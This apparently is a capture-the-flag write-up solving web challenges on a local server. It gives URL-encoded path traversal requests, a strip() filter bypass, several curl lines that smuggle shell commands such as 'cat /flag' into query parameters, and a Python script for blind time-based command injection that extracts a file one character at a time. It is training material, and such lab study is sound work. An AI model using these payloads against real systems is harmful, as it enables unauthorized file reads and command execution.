#### path traversal 1:

`curl -v "http://challenge.localhost:80/package/%2e%2e%2f%2e%2e%2f%66%6c%61%67"`
* routes that start with `/package/` are responded
* `../` are filtered.

#### path traversal 2:

if we go with the previous solution:

```
DEBUG: requested_path='/challenge/files/flag'
127.0.0.1 - - [09/Mar/2025 02:23:58] "GET /content/..%2f..%2fflag HTTP/1.1" 404 -
```

it uses `strip()` to remove path traversal stuff:

`requested_path = app.root_path + "/files/" + path.strip("/.")`

notice these:

```python
>>> "/../../../flag".strip("/.")
'flag'
>>> "fortunes/../../../flag".strip("/.")
'fortunes/../../../flag'
```

`strip()` only remove leading or trailing characters not the pattern.

solution:

`curl -v "http://challenge.localhost:80/content/fortunes%2f..%2f..%2f..%2fflag"`

or just encode the whole thing: `/content/fortunes%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%66%6c%61%67`

both are translated into this:

```
DEBUG: requested_path='/challenge/files/fortunes/../../../flag'
127.0.0.1 - - [09/Mar/2025 02:20:07] "GET /content/fortunes%2f..%2f..%2f..%2fflag HTTP/1.1" 200 -
```


#### CMDi 1

`curl "http://challenge.localhost:80/serve?top-path=/;+cat+/flag"`

#### CMDi 2

`curl "http://challenge.localhost:80/checkpoint?folder=/challenge&&+cat+/flag"`

#### CMDi 3

`curl "http://challenge.localhost:80/initiative?destination=/challenge'+|+cat+/flag'"

#### CMDi 4

`curl "http://challenge.localhost:80/quest?timezone=MST;cat+/flag"`

#### CMDi 5

it won't show us any result.

```python
import requests
import time

j = 1
flag = ""
while True:
    for i in range(33, 127):
        start = time.time()
        URL = f"http://challenge.localhost:80/quest?file-ref=/challenge/PWN;if [ $(cat /flag | cut -c {j} ) = '{chr(i)}' ]; then sleep 3; fi"
        r = requests.get(URL)
        end = time.time()
        if (end - start) >= 3:
            flag+=chr(i)
            print(flag)
    j+=1
```